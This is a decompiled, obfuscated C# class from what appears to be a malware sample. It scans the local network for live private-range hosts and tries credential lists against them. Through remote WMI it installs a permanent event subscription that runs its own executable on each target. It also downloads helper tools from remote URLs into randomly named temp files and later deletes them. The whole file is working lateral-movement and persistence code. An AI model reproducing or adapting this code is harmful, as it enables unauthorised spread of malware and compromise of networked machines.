using System;
using System.Collections.Generic;
using System.IO;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Threading;
using System.Threading.Tasks;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace gZJMShdGuoGG;

internal sealed class rOTpOhnZQZvUMWF
{
	private sealed class xuxUGXwbLoFVYA
	{
		public string nfHECMQWTTClR;

		public string sBohcddbSUum;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CRun_003Eb__1(string string_0)
		{
			if ((!string_0.StartsWith(getString_0(107408771)) && !string_0.StartsWith(getString_0(107408798)) && !string_0.StartsWith(getString_0(107408789)) && !string_0.StartsWith(getString_0(107394814))) || !xAtHxvfThCWFW(string_0))
			{
				return;
			}
			try
			{
				if (pMhSnWjBfMXV.zArXlyFCOP == getString_0(107396887))
				{
					for (int i = 0; i < cninjVDMwzOfRdqC.Count; i++)
					{
						pMhSnWjBfMXV.GmDarSxQnFBGZ(getString_0(107394057), getString_0(107408483) + string_0 + getString_0(107408506) + cninjVDMwzOfRdqC[i] + getString_0(107394067) + WdruvJTyWTIb[i]);
						Thread.Sleep(1000);
						rXGVZWilqdX(string_0, cninjVDMwzOfRdqC[i], WdruvJTyWTIb[i]);
					}
				}
				else
				{
					pMhSnWjBfMXV.GmDarSxQnFBGZ(getString_0(107394057), getString_0(107408483) + string_0);
					Thread.Sleep(1000);
				}
			}
			catch
			{
			}
			if (pMhSnWjBfMXV.zArXlyFCOP == getString_0(107396887))
			{
				for (int j = 0; j < cninjVDMwzOfRdqC.Count; j++)
				{
					if (pMhSnWjBfMXV.ZLXxZaLrGVPm)
					{
						if (File.Exists(nfHECMQWTTClR))
						{
							pMhSnWjBfMXV.GmDarSxQnFBGZ(nfHECMQWTTClR, getString_0(107408710) + string_0 + getString_0(107408461) + cninjVDMwzOfRdqC[j] + getString_0(107408452) + WdruvJTyWTIb[j] + getString_0(107408475) + Assembly.GetEntryAssembly()!.Location + getString_0(107393192));
						}
					}
					else if (File.Exists(sBohcddbSUum))
					{
						pMhSnWjBfMXV.GmDarSxQnFBGZ(sBohcddbSUum, getString_0(107408710) + string_0 + getString_0(107408461) + cninjVDMwzOfRdqC[j] + getString_0(107408452) + WdruvJTyWTIb[j] + getString_0(107408438) + Assembly.GetEntryAssembly()!.Location + getString_0(107393192));
					}
				}
			}
			else if (pMhSnWjBfMXV.ZLXxZaLrGVPm)
			{
				if (File.Exists(nfHECMQWTTClR))
				{
					pMhSnWjBfMXV.GmDarSxQnFBGZ(nfHECMQWTTClR, getString_0(107408710) + string_0 + getString_0(107408377) + Assembly.GetEntryAssembly()!.Location + getString_0(107393192));
				}
			}
			else if (File.Exists(sBohcddbSUum))
			{
				pMhSnWjBfMXV.GmDarSxQnFBGZ(sBohcddbSUum, getString_0(107408710) + string_0 + getString_0(107408340) + Assembly.GetEntryAssembly()!.Location + getString_0(107393192));
			}
		}

		static xuxUGXwbLoFVYA()
		{
			Strings.CreateGetStringDelegate(typeof(xuxUGXwbLoFVYA));
		}
	}

	public static List<string> wcNqMZAdKmUT;

	public static string MjPufcgWKVnJi;

	public static List<string> cninjVDMwzOfRdqC;

	public static List<string> WdruvJTyWTIb;

	public static List<string> MyNFKwOEDDZv;

	[NonSerialized]
	internal static GetString getString_0;

	public static void rXGVZWilqdX(string string_0, string string_1, string string_2)
	{
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Expected O, but got Unknown
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0035: Expected O, but got Unknown
		//IL_00b5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Expected O, but got Unknown
		//IL_00d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00db: Expected O, but got Unknown
		//IL_017f: Unknown result type (might be due to invalid IL or missing references)
		//IL_018a: Expected O, but got Unknown
		//IL_0185: Unknown result type (might be due to invalid IL or missing references)
		//IL_0217: Unknown result type (might be due to invalid IL or missing references)
		//IL_0222: Expected O, but got Unknown
		//IL_021d: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string text = getString_0(107408707) + string_0 + getString_0(107408734);
			ConnectionOptions val = new ConnectionOptions();
			ManagementScope val2 = null;
			val2 = new ManagementScope(text, val);
			val2.get_Options().set_Username(string_1);
			val2.get_Options().set_Password(string_2);
			val2.get_Options().set_Authority(string.Format(getString_0(107408677), getString_0(107408688)));
			val2.get_Options().set_EnablePrivileges(true);
			val2.get_Options().set_Authentication((AuthenticationLevel)6);
			val2.get_Options().set_Impersonation((ImpersonationLevel)3);
			val2.Connect();
			ManagementClass val3 = new ManagementClass(val2, new ManagementPath(getString_0(107408651)), (ObjectGetOptions)null);
			string text2 = getString_0(107408662);
			WqlEventQuery val4 = new WqlEventQuery(text2);
			ManagementObject val5 = val3.CreateInstance();
			((ManagementBaseObject)val5).set_Item(getString_0(107408537), (object)getString_0(107408528));
			((ManagementBaseObject)val5).set_Item(getString_0(107409023), (object)((ManagementQuery)val4).get_QueryString());
			((ManagementBaseObject)val5).set_Item(getString_0(107409014), (object)((ManagementQuery)val4).get_QueryLanguage());
			((ManagementBaseObject)val5).set_Item(getString_0(107408961), (object)getString_0(107408940));
			val5.Put();
			ManagementObject val6 = new ManagementClass(val2, new ManagementPath(getString_0(107408955)), (ObjectGetOptions)null).CreateInstance();
			((ManagementBaseObject)val6).set_Item(getString_0(107408537), (object)getString_0(107408922));
			((ManagementBaseObject)val6).set_Item(getString_0(107408869), (object)(getString_0(107408707) + string_0 + getString_0(107408880) + Path.GetFileName(Assembly.GetEntryAssembly()!.Location)));
			val6.Put();
			ManagementObject val7 = new ManagementClass(val2, new ManagementPath(getString_0(107408859)), (ObjectGetOptions)null).CreateInstance();
			((ManagementBaseObject)val7).set_Item(getString_0(107408822), (object)val5.get_Path().get_RelativePath());
			((ManagementBaseObject)val7).set_Item(getString_0(107408781), (object)val6.get_Path().get_RelativePath());
			val7.Put();
		}
		catch (Exception)
		{
		}
	}

	public static void lGhuCtbimkWaDdBZ()
	{
		xuxUGXwbLoFVYA CS_0024_003C_003E8__locals0 = new xuxUGXwbLoFVYA();
		List<ThIhlgSJzgKdfiW> list = ThIhlgSJzgKdfiW.XaADhZmNBF();
		foreach (ThIhlgSJzgKdfiW item in list)
		{
			wcNqMZAdKmUT.Add(item.IPAddress);
		}
		CS_0024_003C_003E8__locals0.nfHECMQWTTClR = getString_0(107394811);
		CS_0024_003C_003E8__locals0.sBohcddbSUum = getString_0(107394811);
		try
		{
			CS_0024_003C_003E8__locals0.nfHECMQWTTClR = JCpjeeZsfe();
		}
		catch
		{
		}
		try
		{
			CS_0024_003C_003E8__locals0.sBohcddbSUum = tQgSfzzqrxY();
		}
		catch
		{
		}
		foreach (ThIhlgSJzgKdfiW item2 in list)
		{
			try
			{
				if (item2.IPAddress.StartsWith(getString_0(107408768)) || item2.IPAddress.StartsWith(getString_0(107408795)) || item2.IPAddress.StartsWith(getString_0(107408786)) || item2.IPAddress.StartsWith(getString_0(107394811)))
				{
					SUbmEzFpRbQMD.AIegeOFLxeoOIJ(item2.MacAddress, item2.IPAddress, getString_0(107408229));
				}
			}
			catch
			{
			}
		}
		try
		{
			Parallel.ForEach(wcNqMZAdKmUT, delegate(string string_0)
			{
				if ((string_0.StartsWith(xuxUGXwbLoFVYA.getString_0(107408771)) || string_0.StartsWith(xuxUGXwbLoFVYA.getString_0(107408798)) || string_0.StartsWith(xuxUGXwbLoFVYA.getString_0(107408789)) || string_0.StartsWith(xuxUGXwbLoFVYA.getString_0(107394814))) && xAtHxvfThCWFW(string_0))
				{
					try
					{
						if (pMhSnWjBfMXV.zArXlyFCOP == xuxUGXwbLoFVYA.getString_0(107396887))
						{
							for (int i = 0; i < cninjVDMwzOfRdqC.Count; i++)
							{
								pMhSnWjBfMXV.GmDarSxQnFBGZ(xuxUGXwbLoFVYA.getString_0(107394057), xuxUGXwbLoFVYA.getString_0(107408483) + string_0 + xuxUGXwbLoFVYA.getString_0(107408506) + cninjVDMwzOfRdqC[i] + xuxUGXwbLoFVYA.getString_0(107394067) + WdruvJTyWTIb[i]);
								Thread.Sleep(1000);
								rXGVZWilqdX(string_0, cninjVDMwzOfRdqC[i], WdruvJTyWTIb[i]);
							}
						}
						else
						{
							pMhSnWjBfMXV.GmDarSxQnFBGZ(xuxUGXwbLoFVYA.getString_0(107394057), xuxUGXwbLoFVYA.getString_0(107408483) + string_0);
							Thread.Sleep(1000);
						}
					}
					catch
					{
					}
					if (pMhSnWjBfMXV.zArXlyFCOP == xuxUGXwbLoFVYA.getString_0(107396887))
					{
						for (int j = 0; j < cninjVDMwzOfRdqC.Count; j++)
						{
							if (pMhSnWjBfMXV.ZLXxZaLrGVPm)
							{
								if (File.Exists(CS_0024_003C_003E8__locals0.nfHECMQWTTClR))
								{
									pMhSnWjBfMXV.GmDarSxQnFBGZ(CS_0024_003C_003E8__locals0.nfHECMQWTTClR, xuxUGXwbLoFVYA.getString_0(107408710) + string_0 + xuxUGXwbLoFVYA.getString_0(107408461) + cninjVDMwzOfRdqC[j] + xuxUGXwbLoFVYA.getString_0(107408452) + WdruvJTyWTIb[j] + xuxUGXwbLoFVYA.getString_0(107408475) + Assembly.GetEntryAssembly()!.Location + xuxUGXwbLoFVYA.getString_0(107393192));
								}
							}
							else if (File.Exists(CS_0024_003C_003E8__locals0.sBohcddbSUum))
							{
								pMhSnWjBfMXV.GmDarSxQnFBGZ(CS_0024_003C_003E8__locals0.sBohcddbSUum, xuxUGXwbLoFVYA.getString_0(107408710) + string_0 + xuxUGXwbLoFVYA.getString_0(107408461) + cninjVDMwzOfRdqC[j] + xuxUGXwbLoFVYA.getString_0(107408452) + WdruvJTyWTIb[j] + xuxUGXwbLoFVYA.getString_0(107408438) + Assembly.GetEntryAssembly()!.Location + xuxUGXwbLoFVYA.getString_0(107393192));
							}
						}
					}
					else if (pMhSnWjBfMXV.ZLXxZaLrGVPm)
					{
						if (File.Exists(CS_0024_003C_003E8__locals0.nfHECMQWTTClR))
						{
							pMhSnWjBfMXV.GmDarSxQnFBGZ(CS_0024_003C_003E8__locals0.nfHECMQWTTClR, xuxUGXwbLoFVYA.getString_0(107408710) + string_0 + xuxUGXwbLoFVYA.getString_0(107408377) + Assembly.GetEntryAssembly()!.Location + xuxUGXwbLoFVYA.getString_0(107393192));
						}
					}
					else if (File.Exists(CS_0024_003C_003E8__locals0.sBohcddbSUum))
					{
						pMhSnWjBfMXV.GmDarSxQnFBGZ(CS_0024_003C_003E8__locals0.sBohcddbSUum, xuxUGXwbLoFVYA.getString_0(107408710) + string_0 + xuxUGXwbLoFVYA.getString_0(107408340) + Assembly.GetEntryAssembly()!.Location + xuxUGXwbLoFVYA.getString_0(107393192));
					}
				}
			});
		}
		catch
		{
			return;
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.nfHECMQWTTClR))
			{
				File.Delete(CS_0024_003C_003E8__locals0.nfHECMQWTTClR);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.sBohcddbSUum))
			{
				File.Delete(CS_0024_003C_003E8__locals0.sBohcddbSUum);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string JCpjeeZsfe()
	{
		if (IntPtr.Size == 8)
		{
			return AyGrpVhShjBkARb(new Uri(pMhSnWjBfMXV.XpzNMVUBwHhS(getString_0(107408240))));
		}
		return AyGrpVhShjBkARb(new Uri(pMhSnWjBfMXV.XpzNMVUBwHhS(getString_0(107408240))));
	}

	public static string tQgSfzzqrxY()
	{
		if (IntPtr.Size == 8)
		{
			return AyGrpVhShjBkARb(new Uri(pMhSnWjBfMXV.XpzNMVUBwHhS(getString_0(107408159))));
		}
		return AyGrpVhShjBkARb(new Uri(pMhSnWjBfMXV.XpzNMVUBwHhS(getString_0(107408082))));
	}

	public static bool xAtHxvfThCWFW(string string_0)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(string_0);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static string AyGrpVhShjBkARb(Uri uri_0)
	{
		string path = Path.GetRandomFileName().Replace(getString_0(107408688), getString_0(107394811)).Remove(0, 3) + getString_0(107408489);
		WebClient webClient = new WebClient();
		webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}

	static rOTpOhnZQZvUMWF()
	{
		Strings.CreateGetStringDelegate(typeof(rOTpOhnZQZvUMWF));
		wcNqMZAdKmUT = new List<string>();
		MjPufcgWKVnJi = getString_0(107394811);
		cninjVDMwzOfRdqC = new List<string>();
		WdruvJTyWTIb = new List<string>();
		MyNFKwOEDDZv = new List<string>();
	}
}
